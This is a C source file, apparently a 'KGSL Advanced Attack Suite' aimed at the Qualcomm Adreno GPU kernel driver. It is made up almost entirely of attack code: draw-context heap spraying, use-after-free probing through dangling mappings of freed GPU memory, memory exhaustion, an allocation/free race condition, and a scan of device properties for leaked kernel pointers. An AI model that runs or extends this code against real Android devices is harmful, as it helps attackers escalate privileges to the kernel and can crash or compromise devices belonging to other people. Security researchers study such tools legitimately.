/*
 * KGSL Timing Attack - Cross-process + Timing Race
 *
 * Strategy:
 * 1. Fork child process to spray allocations
 * 2. Parent closes FDs to free GPU memory
 * 3. Child tries to reclaim those addresses
 * 4. Also check if kernel objects (ctx, cmd) can be sprayed
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <signal.h>
#include <pthread.h>

// KGSL definitions
#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_GPUMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE, 0x33, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_GET_INFO _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_get_info)
#define IOCTL_KGSL_GPUMEM_FREE_ID _IOWR(KGSL_IOC_TYPE, 0x35, struct kgsl_gpumem_free_id)
#define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOWR(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

#define KGSL_MEMFLAGS_GPUREADONLY 0x1000000UL
#define KGSL_CONTEXT_PREAMBLE 0x20

struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    unsigned long size;
    unsigned long mmapsize;
    unsigned long gpuaddr;
};

struct kgsl_gpumem_get_info
{
    unsigned long gpuaddr;
    unsigned int id;
    unsigned int flags;
    unsigned long size;
    unsigned long mmapsize;
    unsigned long useraddr;
};

struct kgsl_gpumem_free_id
{
    unsigned int id;
    unsigned int flags;
};

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    unsigned long sizebytes;
};

struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

// Shared memory for cross-process communication
typedef struct
{
    volatile int ready;
    volatile int parent_freed;
    volatile int child_done;
    volatile unsigned long victim_addrs[100];
    volatile int victim_count;
    volatile int reuse_detected;
    volatile unsigned long reused_addr;
} shared_state_t;

// ================== Attack 1: Context Object Spray ==================
void attack_context_spray(int fd)
{
    printf("\n=== Attack 1: Draw Context Spray ===\n");

    unsigned int ctx_ids[200];
    int ctx_count = 0;

    // Create many contexts
    printf("[*] Creating draw contexts...\n");
    for (int i = 0; i < 200; i++)
    {
        struct kgsl_drawctxt_create create = {0};
        create.flags = KGSL_CONTEXT_PREAMBLE;

        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) == 0)
        {
            ctx_ids[ctx_count++] = create.drawctxt_id;
        }
    }
    printf("[+] Created %d contexts\n", ctx_count);

    if (ctx_count < 10)
    {
        printf("[-] Too few contexts, skipping\n");
        return;
    }

    // Destroy first half
    printf("[*] Destroying first half (%d contexts)...\n", ctx_count / 2);
    for (int i = 0; i < ctx_count / 2; i++)
    {
        struct kgsl_drawctxt_destroy destroy = {0};
        destroy.drawctxt_id = ctx_ids[i];
        ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
    }

    // Spray new contexts - check if IDs reused
    printf("[*] Spraying new contexts...\n");
    int reused = 0;
    for (int i = 0; i < 100; i++)
    {
        struct kgsl_drawctxt_create create = {0};
        create.flags = KGSL_CONTEXT_PREAMBLE;

        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) == 0)
        {
            // Check if this ID was in the first half
            for (int j = 0; j < ctx_count / 2; j++)
            {
                if (create.drawctxt_id == ctx_ids[j])
                {
                    reused++;
                    break;
                }
            }
        }
    }

    printf("[+] Context ID reuse: %d\n", reused);

    // Cleanup - destroy remaining
    for (int i = ctx_count / 2; i < ctx_count; i++)
    {
        struct kgsl_drawctxt_destroy destroy = {0};
        destroy.drawctxt_id = ctx_ids[i];
        ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
    }
}

// ================== Attack 2: ID Reuse Attack ==================
void attack_id_reuse(int fd)
{
    printf("\n=== Attack 2: Memory ID Reuse Attack ===\n");

    struct
    {
        unsigned int id;
        void *map;
        unsigned long gpuaddr;
    } victims[50];
    int victim_count = 0;

    // Allocate victims
    printf("[*] Creating victim allocations...\n");
    for (int i = 0; i < 50; i++)
    {
        struct kgsl_gpumem_alloc_id alloc = {0};
        alloc.size = 0x1000;
        alloc.flags = KGSL_MEMFLAGS_GPUREADONLY;

        if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) == 0)
        {
            void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                             MAP_SHARED, fd, alloc.id * 0x1000);
            if (map != MAP_FAILED)
            {
                victims[victim_count].id = alloc.id;
                victims[victim_count].map = map;
                victims[victim_count].gpuaddr = alloc.gpuaddr;

                // Mark the memory
                *(unsigned long *)map = 0xDEADBEEF00000000ULL | alloc.id;
                victim_count++;
            }
        }
    }
    printf("[+] Created %d victims\n", victim_count);

    // Save IDs before freeing
    unsigned int freed_ids[50];
    unsigned long freed_markers[50];
    for (int i = 0; i < victim_count; i++)
    {
        freed_ids[i] = victims[i].id;
        freed_markers[i] = *(unsigned long *)victims[i].map;
    }

    // Free the first half (but keep maps)
    printf("[*] Freeing first half with GPUMEM_FREE_ID...\n");
    for (int i = 0; i < victim_count / 2; i++)
    {
        struct kgsl_gpumem_free_id free_op = {0};
        free_op.id = victims[i].id;
        int ret = ioctl(fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_op);
        if (ret != 0)
        {
            printf("    Free ID %u failed: %d (errno=%d)\n", victims[i].id, ret, errno);
        }
    }

    // Try to allocate new memory - check if IDs are reused
    printf("[*] Allocating new memory, checking for ID reuse...\n");
    int id_reused = 0;
    int addr_reused = 0;
    for (int i = 0; i < 100; i++)
    {
        struct kgsl_gpumem_alloc_id alloc = {0};
        alloc.size = 0x1000;
        alloc.flags = KGSL_MEMFLAGS_GPUREADONLY;

        if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) == 0)
        {
            for (int j = 0; j < victim_count / 2; j++)
            {
                if (alloc.id == freed_ids[j])
                {
                    id_reused++;
                    printf("  [!] ID %u reused!\n", alloc.id);

                    // Check if we can read old data via dangling map
                    if (victims[j].map != MAP_FAILED)
                    {
                        unsigned long val = *(unsigned long *)victims[j].map;
                        if (val == freed_markers[j])
                        {
                            printf("  [!] Old marker still present: 0x%lx\n", val);
                        }
                        else
                        {
                            printf("  [!] Memory changed! Old: 0x%lx, New: 0x%lx\n",
                                   freed_markers[j], val);
                        }
                    }
                }
                if (alloc.gpuaddr == victims[j].gpuaddr)
                {
                    addr_reused++;
                    printf("  [!] GPU addr 0x%lx reused!\n", alloc.gpuaddr);
                }
            }

            // Free the new allocation
            struct kgsl_gpumem_free_id free_op = {0};
            free_op.id = alloc.id;
            ioctl(fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_op);
        }
    }

    printf("[+] ID reuse: %d, GPU addr reuse: %d\n", id_reused, addr_reused);

    // Cleanup
    for (int i = victim_count / 2; i < victim_count; i++)
    {
        if (victims[i].map != MAP_FAILED)
        {
            munmap(victims[i].map, 0x1000);
        }
        struct kgsl_gpumem_free_id free_op = {0};
        free_op.id = victims[i].id;
        ioctl(fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_op);
    }
}

// ================== Attack 3: Memory Exhaustion ==================
void attack_memory_exhaustion(int fd)
{
    printf("\n=== Attack 3: Memory Exhaustion Attack ===\n");

    struct
    {
        unsigned int id;
        void *map;
        unsigned long gpuaddr;
        unsigned long size;
    } allocs[500];
    int alloc_count = 0;
    unsigned long total_size = 0;

    // Allocate increasingly large buffers until failure
    printf("[*] Exhausting GPU memory...\n");
    unsigned long sizes[] = {0x1000, 0x10000, 0x100000, 0x1000000};
    int size_idx = 0;

    for (int round = 0; round < 500 && size_idx < 4; round++)
    {
        struct kgsl_gpumem_alloc_id alloc = {0};
        alloc.size = sizes[size_idx];
        alloc.flags = KGSL_MEMFLAGS_GPUREADONLY;

        if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) == 0)
        {
            void *map = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                             MAP_SHARED, fd, alloc.id * 0x1000);
            if (map != MAP_FAILED)
            {
                allocs[alloc_count].id = alloc.id;
                allocs[alloc_count].map = map;
                allocs[alloc_count].gpuaddr = alloc.gpuaddr;
                allocs[alloc_count].size = alloc.mmapsize;
                alloc_count++;
                total_size += alloc.mmapsize;
            }
        }
        else
        {
            // Try smaller size
            if (errno == ENOMEM || errno == EINVAL)
            {
                size_idx++;
            }
        }
    }

    printf("[+] Allocated %d buffers, total: %lu MB\n", alloc_count, total_size / (1024 * 1024));

    // Check for address wrapping or overlap
    printf("[*] Checking for address anomalies...\n");
    for (int i = 0; i < alloc_count; i++)
    {
        for (int j = i + 1; j < alloc_count; j++)
        {
            // Check overlap
            unsigned long start1 = allocs[i].gpuaddr;
            unsigned long end1 = start1 + allocs[i].size;
            unsigned long start2 = allocs[j].gpuaddr;
            unsigned long end2 = start2 + allocs[j].size;

            if ((start1 < end2) && (start2 < end1))
            {
                printf("  [!] OVERLAP: [%d] 0x%lx-0x%lx overlaps with [%d] 0x%lx-0x%lx\n",
                       i, start1, end1, j, start2, end2);
            }
        }
    }

    // Write markers and verify isolation
    printf("[*] Writing markers...\n");
    for (int i = 0; i < alloc_count && i < 100; i++)
    {
        if (allocs[i].map != MAP_FAILED)
        {
            *(unsigned long *)allocs[i].map = 0xBAD0000000000000ULL | i;
        }
    }

    printf("[*] Verifying isolation...\n");
    int corruption = 0;
    for (int i = 0; i < alloc_count && i < 100; i++)
    {
        if (allocs[i].map != MAP_FAILED)
        {
            unsigned long val = *(unsigned long *)allocs[i].map;
            unsigned long expected = 0xBAD0000000000000ULL | i;
            if (val != expected)
            {
                printf("  [!] CORRUPTION at [%d]: expected 0x%lx, got 0x%lx\n",
                       i, expected, val);
                corruption++;
            }
        }
    }
    printf("[+] Corruptions found: %d\n", corruption);

    // Cleanup
    printf("[*] Cleanup...\n");
    for (int i = 0; i < alloc_count; i++)
    {
        if (allocs[i].map != MAP_FAILED)
        {
            munmap(allocs[i].map, allocs[i].size);
        }
        struct kgsl_gpumem_free_id free_op = {0};
        free_op.id = allocs[i].id;
        ioctl(fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_op);
    }
}

// ================== Attack 4: Race Condition on Free ==================
volatile int race_running = 1;
volatile int race_hits = 0;
int race_fd;
unsigned int race_ids[100];
int race_id_count = 0;

void *race_free_thread(void *arg)
{
    while (race_running)
    {
        for (int i = 0; i < race_id_count; i++)
        {
            struct kgsl_gpumem_free_id free_op = {0};
            free_op.id = race_ids[i];
            ioctl(race_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_op);
        }
        usleep(1);
    }
    return NULL;
}

void *race_alloc_thread(void *arg)
{
    while (race_running)
    {
        struct kgsl_gpumem_alloc_id alloc = {0};
        alloc.size = 0x1000;
        alloc.flags = KGSL_MEMFLAGS_GPUREADONLY;

        if (ioctl(race_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) == 0)
        {
            // Check if this is one of the race IDs
            for (int i = 0; i < race_id_count; i++)
            {
                if (alloc.id == race_ids[i])
                {
                    race_hits++;
                    break;
                }
            }

            // Free it again
            struct kgsl_gpumem_free_id free_op = {0};
            free_op.id = alloc.id;
            ioctl(race_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_op);
        }
        usleep(1);
    }
    return NULL;
}

void attack_race_free(int fd)
{
    printf("\n=== Attack 4: Race Condition on Free ===\n");

    race_fd = fd;
    race_id_count = 0;

    // Allocate target objects
    printf("[*] Allocating race targets...\n");
    for (int i = 0; i < 100; i++)
    {
        struct kgsl_gpumem_alloc_id alloc = {0};
        alloc.size = 0x1000;
        alloc.flags = KGSL_MEMFLAGS_GPUREADONLY;

        if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) == 0)
        {
            race_ids[race_id_count++] = alloc.id;
        }
    }
    printf("[+] Created %d targets\n", race_id_count);

    // Start racing threads
    printf("[*] Racing for 5 seconds...\n");
    race_running = 1;
    race_hits = 0;

    pthread_t t_free, t_alloc;
    pthread_create(&t_free, NULL, race_free_thread, NULL);
    pthread_create(&t_alloc, NULL, race_alloc_thread, NULL);

    sleep(5);
    race_running = 0;

    pthread_join(t_free, NULL);
    pthread_join(t_alloc, NULL);

    printf("[+] Race hits: %d\n", race_hits);
}

// ================== Attack 5: GPU Property Leak ==================
void attack_property_leak(int fd)
{
    printf("\n=== Attack 5: GPU Property Information Leak ===\n");

    // Try to leak kernel info via properties
    unsigned char buffer[4096];

    // Property types from msm_kgsl.h
    unsigned int props[] = {
        0x1,   // DEVICE_INFO
        0x2,   // DEVICE_SHADOW
        0x3,   // DEVICE_POWER
        0x4,   // SHMEM
        0x5,   // SHMEM_APERTURES
        0x10,  // MMU_ENABLE
        0x11,  // INTERRUPT_WAITS
        0x12,  // VERSION
        0x15,  // SP_GENERIC_MEM
        0x16,  // UCHE_GMEM_VADDR
        0x17,  // SP_POWER_COUNTER
        0x18,  // GPMU_POWER_COUNTER
        0x19,  // PWR_CONSTRAINT
        0x20,  // SECURE_CONTEXT
        0x21,  // DEVICE_BITNESS
        0x22,  // SECURE_BUFFER_ALIGNMENT
        0x23,  // HIGHEST_BANK_BIT
        0x24,  // MIN_ACCESS_LENGTH
        0x25,  // UBWC_MODE
        0x26,  // DEVICE_QDSS_STM
        0x27,  // SECURE_CTXTS
        0x28,  // L3_PWR_CONSTRAINT
        0x29,  // CONTEXT_PROPERTY
        0x2A,  // GPU_MODEL
        0x2B,  // GPU_SPEED_BIN
        0x2C,  // VK_DEVICE_ID
        0x100, // SPEED_BIN
        0x101, // GAMING_BIN
        0x102, // GPU_PROC_PRIV
        0x103, // GPU_FEATURE_INFO
    };

    for (int i = 0; i < sizeof(props) / sizeof(props[0]); i++)
    {
        memset(buffer, 0, sizeof(buffer));

        struct kgsl_device_getproperty prop = {0};
        prop.type = props[i];
        prop.value = buffer;
        prop.sizebytes = sizeof(buffer);

        int ret = ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop);
        if (ret == 0)
        {
            printf("[+] Property 0x%02x: ", props[i]);

            // Check for potential kernel pointers
            int has_ptr = 0;
            for (int j = 0; j < 4096 - 8; j += 8)
            {
                unsigned long val = *(unsigned long *)(buffer + j);
                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL ||
                    (val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
                {
                    if (!has_ptr)
                    {
                        printf("\n    Potential kernel pointers:\n");
                        has_ptr = 1;
                    }
                    printf("    [+%d] 0x%016lx\n", j, val);
                }
            }

            if (!has_ptr)
            {
                // Print first 32 bytes
                printf("data: ");
                for (int j = 0; j < 32; j++)
                {
                    printf("%02x", buffer[j]);
                    if (j % 8 == 7)
                        printf(" ");
                }
                printf("\n");
            }
        }
    }
}

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Advanced Attack Suite                                    ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        perror("[-] Failed to open /dev/kgsl-3d0");
        return 1;
    }
    printf("[+] Opened KGSL device (fd=%d)\n", fd);

    // Run all attacks
    attack_context_spray(fd);
    attack_id_reuse(fd);
    attack_memory_exhaustion(fd);
    attack_race_free(fd);
    attack_property_leak(fd);

    close(fd);
    printf("\n=== All attacks complete ===\n");

    return 0;
}
